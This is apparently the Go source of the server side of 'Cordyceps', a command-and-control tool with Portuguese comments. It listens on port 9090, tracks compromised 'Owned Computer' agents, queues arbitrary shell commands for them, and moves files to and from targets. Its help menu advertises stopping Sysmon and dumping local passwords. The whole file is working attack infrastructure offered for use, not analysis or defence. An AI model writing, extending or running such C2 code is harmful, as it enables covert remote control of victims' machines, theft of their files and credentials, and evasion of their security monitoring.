package main

import (
	commons "NetBios/C2/d3c/commons/estruturas"
	"NetBios/C2/d3c/commons/helpers"
	"bufio"
	"encoding/gob"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
)

var (
	agentesEmCampo    = []commons.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	fmt.Print(" ____                     __                                           \n")
	fmt.Print("/\\  _`\\                  /\\ \\                                          \n")
	fmt.Print("\\ \\ \\/\\_\\    ___   _ __  \\_\\ \\  __  __    ___     __   _____     ____  \n")
	fmt.Print(" \\ \\ \\/_/_  / __`\\/\\`'__\\/\\'_` \\ /\\ \\/\\ \\  /'___\\ /'__`\\/\\ '__`\\  /',__\\ \n")
	fmt.Print("  \\ \\ \\L\\ \\/\\ \\L\\ \\ \\ \\//\\ \\L\\ \\ \\ \\_\\ \\/\\ \\__//\\  __/\\ \\ \\L\\ \\/\\__, `\\\n")
	fmt.Print("   \\ \\____/\\ \\____/\\ \\_\\\\ \\___,_\\`\\____ \\ \\____\\ \\____\\ \\ ,__/\\/\\____/\n")
	fmt.Print("    \\/___/  \\/___/  \\/_/ \\/__,_ /`/___/> \\/____/\\/____/ \\ \\ \\/  \\/___/ \n")
	fmt.Print("                                    /\\___/               \\ \\_\\        \n")
	fmt.Print("     ")
	println("--------------------Developed By V3x0r-------------------------")
	println("")
	println("")
	println("")
	//Escuta na porta 9090
	go startListener("9090")
	cliHandler()
}

// ClI do C2
func cliHandler() {
	for {
		if agenteSelecionado != "" {
			print(agenteSelecionado + "# ")
		} else {
			// Nome do Servidor
			print("Cordyceps> ")
		}
		// Le o que foi digitado
		reader := bufio.NewReader(os.Stdin)
		// Detecta que o fim da linha é quando digita Enter\n
		comandoCompleto, _ := reader.ReadString('\n')

		//verifica o comando enviado
		comandoSeparado := helpers.SeparaComando(comandoCompleto)
		comandoBase := strings.TrimSpace(comandoSeparado[0])
		//verifica se o comando enviado nao foi apenas um Enter
		if len(comandoBase) > 0 {
			switch comandoBase {
			case "show":
				showHandler(comandoSeparado)
			case "select":
				selectHandler(comandoSeparado)
			case "help":
				helpHandler(comandoSeparado)
			case "send":
				//Comando para upload
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					var erro error
					arquivoParaEnviar := &commons.Arquivo{}
					arquivoParaEnviar.Nome = comandoSeparado[1]
					arquivoParaEnviar.Conteudo, erro = os.ReadFile(arquivoParaEnviar.Nome)
					comandoSend := &commons.Commando{}
					comandoSend.Comando = comandoSeparado[0]
					comandoSend.Arquivo = *arquivoParaEnviar
					if erro != nil {
						log.Println("Error reading file: ", erro.Error())
					} else {
						agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
					}
				} else {
					println("Specify the file to be uploaded")
				}
			case "get":
				//Comando para dowload
				if len(comandoSeparado) > 0 && agenteSelecionado != "" {
					comandoSend := &commons.Commando{}
					comandoSend.Comando = comandoCompleto

					agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
				} else {
					println("Specify the file to be Dowaload")
				}
			case "exit":
				exitHandler(comandoSeparado)
			case "ping":
				pongHandler(comandoSeparado)
			default:
				if agenteSelecionado != "" {
					//Envia o Comando para o agente selecionado
					comando := commons.Commando{}
					comando.Comando = comandoCompleto

					for indice, agent := range agentesEmCampo {
						if agent.AgentID == agenteSelecionado {
							//Adicionar no mensagem o comando
							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *&comando)
						}
					}
				} else {
					log.Println("Invalid Command")
				}
			}
		}
	}
}

func helpHandler(comando []string) {
	if len(comando) > 0 {
		println("Server Commands:")
		println("show agents:           List all agents in exucation")
		println("select + ID do agent:  Selects agent with specified id")
		println("send:                  Send Files to Target")
		println("get:                   Download Files to Host")
		println("exit:                  Exite for Agente Selected")
		println("stopsys:                  Stop Sysmon Service Running")
		println("startsys:                  Start Sysmon Service Running")
		//TODO - Modulo de Quebrar Senhas
		println("passwd:           Dump Passwords for local machine")
	} else {
		println("Comando não Encontrado")
	}
}
func showHandler(comando []string) {
	if len(comando) > 1 {
		switch comando[1] {
		case "agents":
			for _, agente := range agentesEmCampo {
				if 1 == 1 {
					println("Owned Computer: " + agente.AgentID)
				} else {
					println("Owned Computer with closed connection: " + agente.AgentID)
				}
			}
		default:
			log.Println("Command Passed Wrong, Use: show agents -a")
		}
	}
}

func pongHandler(comando []string) {
	//TODO - Implementar Funcao para verificar conexao

}

func selectHandler(comando []string) {
	if len(comando) > 1 {
		if agenteCadastrado(comando[1]) {
			agenteSelecionado = comando[1]
		} else {
			log.Println("Agent not found, To list your agents use: show agents")
		}
	}

}
func exitHandler(comando []string) {
	if len(comando) > 1 {
		if agenteCadastrado(comando[1]) {
		}
	} else {
		agenteSelecionado = ""
	}
}

// Verifica se o Agent já esta cadastrado
func agenteCadastrado(agentID string) (cadastrado bool) {
	//Inicia como Falso
	cadastrado = false
	//Verifica o range de agents
	for _, agente := range agentesEmCampo {
		//Se o ID agent for igual
		if agente.AgentID == agentID {
			//Retorna agent True para cadastrado
			cadastrado = true
		}
	}
	return cadastrado
}
func mensagemContemResposta(mensagem commons.Mensagem) (contem bool) {
	contem = false
	for _, commando := range mensagem.Comandos {
		if len(commando.Resposta) > 0 {
			contem = true
		}
	}
	return contem

}

func posicaoDoAgenteEmCampo(agentId string) (posicao int) {
	for indice, agente := range agentesEmCampo {
		if agentId == agente.AgentID {
			posicao = indice
		}
	}
	return posicao
}
func salvarArquivo(arquivo commons.Arquivo) {
	err := ioutil.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)
	if err != nil {
		println("Erro ao Salvar Arquivo" + err.Error())
	}
}
func startListener(port string) {
	//0.0.0.0:9090 Abre Conexão TCP
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Erro", err.Error())
	} else {
		for {
			//Canal Aceita Conexões
			canal, err := listener.Accept()
			if err != nil {
				log.Println("Erro:", err.Error())
				//Fechar Canal quando não utilizar
				defer canal.Close()
			} else {
				mensagem := &commons.Mensagem{}
				gob.NewDecoder(canal).Decode(mensagem)

				// Verificar se o Agent Está Instalado
				if agenteCadastrado(mensagem.AgentID) {
					if mensagemContemResposta(*mensagem) {
						log.Println("Connected Computer ID:", mensagem.AgentID)
						//Exibir resposta
						for indice, commando := range mensagem.Comandos {
							//log.Println("Comando:", commando.Comando)
							println("Response:", commando.Resposta)
							if helpers.SeparaComando(commando.Comando)[0] == "get" &&
								mensagem.Comandos[indice].Arquivo.Erro == false {

								salvarArquivo(mensagem.Comandos[indice].Arquivo)

							} else {

							}
						}
					}
					// Envia a resposta para o Agent
					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentID)])
					// Zera a Lista de Comandos
					agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentID)].Comandos = []commons.Commando{}
				} else {
					//Se não, mostra somente o ID do Agent
					log.Println("New IP Connection:", canal.RemoteAddr().String(), "ID:", mensagem.AgentID)
					agentesEmCampo = append(agentesEmCampo, *mensagem)
					gob.NewEncoder(canal).Encode(mensagem)
				}

			}

		}

	}
}
